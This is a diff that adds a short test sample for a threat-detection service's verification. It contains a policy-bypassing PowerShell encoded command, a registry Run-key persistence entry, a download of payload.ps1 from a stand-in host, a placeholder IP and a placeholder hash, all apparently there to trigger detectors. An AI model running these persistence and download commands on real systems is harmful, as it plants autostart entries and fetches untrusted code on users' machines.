@@ -1,0 +1,7 @@
+# Test sample for ThreatRecon.io verification
+$Encoded = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAFYAZQByAGkAZgB5AFQAZQBzAHQAIgA7ACAAdwBoAG8AYQBtAGkAIAAvAGEAbAGwA"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $Encoded
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "VerifyTest" -Value "powershell.exe -File C:\Users\Public\verify-test.ps1"
+Invoke-WebRequest -Uri "http://example-verification-test.com/payload.ps1" -OutFile "$env:TEMP\payload.ps1"
+Suspicious IP: 192.0.2.55
+Test hash: 111111111111111111111111111111111111111111111111111111111111111e
